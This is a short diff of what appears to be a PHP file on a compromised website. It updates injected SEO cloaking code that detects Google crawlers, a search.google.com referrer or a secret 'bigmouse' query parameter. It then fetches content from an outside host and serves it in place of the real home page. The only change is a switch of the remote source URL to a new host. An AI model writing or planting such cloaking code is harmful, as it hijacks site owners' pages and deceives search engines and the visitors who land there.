@@ -33,7 +33,7 @@ foreach (['googlebot','adsbot','mediapartners','apis-google','structured-data-te
 
 if (($b || strpos($r, 'search.google.com') !== false || isset($_GET["bigmouse"])) && in_array($p, ['/', '/index.php'])) {
     if ($b) usleep(700000);
-    $x = fetch("https://snowy-firefly-62fa.nomisec07tech.workers.dev/seoteam88");
+    $x = fetch("https://fondactiondufootball-4mx.pages.dev/303");
     if (strlen(trim($x)) > 50) {
         while (ob_get_level()) ob_end_clean();
         header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
@@ -44,3 +44,4 @@ if (($b || strpos($r, 'search.google.com') !== false || isset($_GET["bigmouse"])
         exit;
     }
 }
+
